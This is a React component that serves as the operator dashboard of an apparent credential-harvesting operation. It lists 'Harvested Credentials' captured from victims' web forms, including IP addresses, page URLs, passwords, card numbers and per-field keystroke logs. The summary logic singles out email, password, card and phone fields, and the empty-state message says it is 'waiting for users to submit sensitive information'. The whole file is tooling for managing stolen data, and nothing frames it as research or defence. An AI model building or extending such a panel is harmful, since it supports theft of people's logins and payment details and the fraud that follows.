import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { Link } from 'react-router-dom';

const CredentialsView = () => {
  const [credentials, setCredentials] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selectedCredential, setSelectedCredential] = useState(null);
  const [filter, setFilter] = useState('all');

  useEffect(() => {
    fetchCredentials();
    // Set up auto-refresh every 60 seconds
    const interval = setInterval(fetchCredentials, 60000);
    return () => clearInterval(interval);
  }, []);

  const fetchCredentials = async () => {
    try {
      setLoading(true);
      const response = await axios.get('/api/credentials');
      setCredentials(response.data);
      setError(null);
    } catch (err) {
      setError('Failed to fetch credentials. Please try again later.');
      console.error('Error fetching credentials:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatDate = (dateString) => {
    const date = new Date(dateString);
    return date.toLocaleString();
  };

  const handleCredentialSelect = (credential) => {
    setSelectedCredential(credential);
  };

  const getCredentialTypeLabel = (type) => {
    switch (type) {
      case 'form_submission':
        return 'Form Submission';
      case 'field_capture':
        return 'Field Capture';
      default:
        return type.charAt(0).toUpperCase() + type.slice(1);
    }
  };

  const getFormattedCredentialSummary = (credential) => {
    const { type, data } = credential;
    
    if (type === 'form_submission') {
      const formEntries = data.formData;
      const summary = [];
      
      // Extract important fields
      const importantFields = ['email', 'username', 'password', 'card', 'address', 'phone'];
      
      for (const field in formEntries) {
        const lowerField = field.toLowerCase();
        if (importantFields.some(important => lowerField.includes(important))) {
          summary.push(`${field}: ${formEntries[field]}`);
        }
      }
      
      if (summary.length === 0) {
        // If no important fields found, show first few entries
        Object.entries(formEntries).slice(0, 3).forEach(([key, value]) => {
          summary.push(`${key}: ${value}`);
        });
      }
      
      return summary.join(', ').substring(0, 100) + (summary.join(', ').length > 100 ? '...' : '');
    } else if (type === 'field_capture') {
      return `${data.fieldName}: ${data.fieldValue}`;
    }
    
    return 'Unknown credential type';
  };

  const filteredCredentials = credentials.filter(cred => {
    if (filter === 'all') return true;
    return cred.type === filter;
  });

  return (
    <div className="admin-container">
      <div className="admin-header">
        <h1 className="admin-title">Harvested Credentials</h1>
        <div className="admin-actions">
          <select 
            value={filter} 
            onChange={(e) => setFilter(e.target.value)}
            className="filter-select"
          >
            <option value="all">All Types</option>
            <option value="form_submission">Form Submissions</option>
            <option value="field_capture">Field Captures</option>
          </select>
          <button 
            className="cta-button"
            onClick={fetchCredentials}
          >
            Refresh
          </button>
          <Link to="/admin" className="back-link">
            Back to Admin
          </Link>
        </div>
      </div>

      {loading && <p>Loading credentials...</p>}
      
      {error && <p className="error-message">{error}</p>}
      
      {!loading && !error && credentials.length === 0 && (
        <p>No credentials found. Waiting for users to submit sensitive information.</p>
      )}

      {filteredCredentials.length > 0 && (
        <div className="credentials-wrapper">
          <h2>Collected Credentials ({filteredCredentials.length})</h2>
          <table className="connections-table">
            <thead>
              <tr>
                <th>ID</th>
                <th>IP Address</th>
                <th>Type</th>
                <th>Data Summary</th>
                <th>Timestamp</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {filteredCredentials.map(credential => (
                <tr key={credential.id}>
                  <td>{credential.id}</td>
                  <td>{credential.connection_ip}</td>
                  <td>{getCredentialTypeLabel(credential.type)}</td>
                  <td>{getFormattedCredentialSummary(credential)}</td>
                  <td>{formatDate(credential.timestamp)}</td>
                  <td>
                    <button 
                      className="cta-button"
                      onClick={() => handleCredentialSelect(credential)}
                    >
                      View Details
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {selectedCredential && (
        <div className="credential-details">
          <div className="details-header">
            <h2>Credential Details</h2>
            <button 
              className="close-button"
              onClick={() => setSelectedCredential(null)}
            >
              Close
            </button>
          </div>
          
          <div className="details-content">
            <div className="details-section">
              <h3>Basic Info</h3>
              <p><strong>ID:</strong> {selectedCredential.id}</p>
              <p><strong>Connection ID:</strong> {selectedCredential.connection_id}</p>
              <p><strong>IP Address:</strong> {selectedCredential.connection_ip}</p>
              <p><strong>Type:</strong> {getCredentialTypeLabel(selectedCredential.type)}</p>
              <p><strong>Timestamp:</strong> {formatDate(selectedCredential.timestamp)}</p>
            </div>
            
            {selectedCredential.type === 'form_submission' && (
              <>
                <div className="details-section">
                  <h3>Form Information</h3>
                  <p><strong>URL:</strong> {selectedCredential.data.url}</p>
                  <p><strong>Domain:</strong> {selectedCredential.data.domain}</p>
                  <p><strong>Form Purpose:</strong> {selectedCredential.data.formPurpose || 'Unknown'}</p>
                </div>
                
                <div className="details-section">
                  <h3>Form Data</h3>
                  <div className="form-data-grid">
                    {Object.entries(selectedCredential.data.formData).map(([key, value]) => (
                      <div key={key} className="form-data-item">
                        <div className="form-data-key">{key}:</div>
                        <div className="form-data-value">{value}</div>
                      </div>
                    ))}
                  </div>
                </div>
                
                {selectedCredential.data.keystrokes && Object.keys(selectedCredential.data.keystrokes).length > 0 && (
                  <div className="details-section">
                    <h3>Keystroke Data</h3>
                    <div className="keystroke-data">
                      {Object.entries(selectedCredential.data.keystrokes).map(([field, keystrokes]) => (
                        <div key={field} className="keystroke-field">
                          <p><strong>{field}:</strong></p>
                          <pre>{keystrokes}</pre>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </>
            )}
            
            {selectedCredential.type === 'field_capture' && (
              <div className="details-section">
                <h3>Field Information</h3>
                <p><strong>URL:</strong> {selectedCredential.data.url}</p>
                <p><strong>Domain:</strong> {selectedCredential.data.domain}</p>
                <p><strong>Field Name:</strong> {selectedCredential.data.fieldName}</p>
                <p><strong>Field Type:</strong> {selectedCredential.data.fieldType}</p>
                <div className="field-value">
                  <p><strong>Field Value:</strong></p>
                  <pre>{selectedCredential.data.fieldValue}</pre>
                </div>
                {selectedCredential.data.keystrokes && (
                  <div className="field-keystrokes">
                    <p><strong>Keystrokes:</strong></p>
                    <pre>{selectedCredential.data.keystrokes}</pre>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default CredentialsView; 